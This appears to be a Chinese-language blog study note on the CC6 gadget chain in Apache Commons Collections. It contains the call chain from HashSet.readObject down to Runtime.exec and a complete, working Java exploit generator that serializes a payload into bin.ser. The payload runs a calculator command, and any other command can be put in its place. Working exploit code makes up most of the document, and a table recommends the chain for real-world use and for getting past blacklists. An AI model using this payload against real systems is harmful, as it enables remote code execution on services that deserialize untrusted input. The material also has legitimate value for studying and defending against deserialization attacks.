---
title: CC6
date: 2026-02-03 17:08:07
updated: 2026-02-09 19:45:59
tags:
  - Web
  - java
  - 反序列化
  - CC链
---
| **Gadget Chain** | **CC 版本依赖** | **JDK 版本限制** | **核心入口点 (Source)** | **核心特征/用途** |
| --- | --- | --- | --- | --- |
| **CC6** | 3.1 - 3.2.1 | **无限制** | `HashSet`<br>-> `TiedMapEntry` | **实战首选**。不受 JDK 版本限制，且绕过黑名单的经典链。 |

```java
/*
Gadget chain:
	java.io.ObjectInputStream.readObject()
        java.util.HashSet.readObject()
            java.util.HashMap.put()
            java.util.HashMap.hash()
                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                    org.apache.commons.collections.map.LazyMap.get()
                        org.apache.commons.collections.functors.ChainedTransformer.transform()
                        org.apache.commons.collections.functors.InvokerTransformer.transform()
                        java.lang.reflect.Method.invoke()
                            java.lang.Runtime.exec()
*/
```

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1770494915621-92147dad-2c99-4c7e-9b66-c319578b85c4.png)

# EXP

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6 {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open -a Calculator"})
        };
        HashMap<Object, Object> hashMap1 = new HashMap<>();
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Transformer fakeTransformer = new ChainedTransformer(new Transformer[]{});
        Map Lazymap = LazyMap.decorate(hashMap1, fakeTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(Lazymap, "a");

        HashMap<Object, Object> hashMap2 = new HashMap<>();
        hashMap2.put(tiedMapEntry,1);
        //LazyMap#get执行后会以"a"为键put新的键值对到hashMap1中，因此执行完上一句put后需要remove
        hashMap1.remove("a");

        //为了在构造payload中防止put也一同触发利用链造成干扰，以下片段配合fakeTransformer使用，作用是在put之后再将foctory替换成要用到的chainedTransformer。当然也可以直接使用chainedTransformer序列化，并在反序列化时注释掉unserialize上方所有代码进行验证
        Class c = Lazymap.getClass();
        Field factory = c.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(Lazymap,chainedTransformer);

        serialize(hashMap2);
        //unserialize("bin.ser");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("bin.ser"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        return ois.readObject();
    }
}

```

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1770216110477-e3185d42-14e3-47dc-9303-720c86533477.png)